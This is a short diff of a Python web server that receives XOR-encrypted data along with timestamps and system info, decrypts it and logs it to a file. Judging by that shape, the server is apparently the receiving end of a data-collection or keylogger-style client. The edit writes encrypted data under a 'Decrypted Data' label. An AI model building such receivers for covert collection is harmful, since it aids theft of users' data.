@@ -58,9 +58,9 @@ class Server:
             data_enc = json_data.get('data')
             time = json_data.get('time')
             system = json_data.get('system')
-
+            # print(data_enc)
             data = xor_encrypt_decrypt(data_enc, self.key)
-
+            # print(data)
             if not data:
                 return jsonify({"error": "מחכה לשליחת מידע..."}), 400
 
@@ -80,7 +80,7 @@ class Server:
 
             with open(file_path, "a", encoding="utf-8") as file:
                 file.write(f"Time: {self.logs_dict['time']}\n")
-                file.write(f"Decrypted Data: {self.logs_dict['decrypted_data']}\n")
+                file.write(f"Decrypted Data: {self.logs_dict['encrypted_data']}\n")
                 file.write(f"System Info: {json.dumps(self.logs_dict['system'])}\n")
                 file.write("\n")
 
